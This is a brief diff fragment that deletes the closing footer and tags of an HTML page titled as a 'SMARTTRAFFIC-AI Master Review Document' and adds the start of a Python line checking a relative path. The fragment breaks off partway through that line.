-            <p style="font-size: 0.85rem; margin-top: 5px;">SMARTTRAFFIC-AI Master Review Document — Prepared with deep code inspection & technical rigor.</p>
-        </div>
-    </div>
-</body>
-</html>
+    if not relative_path or "
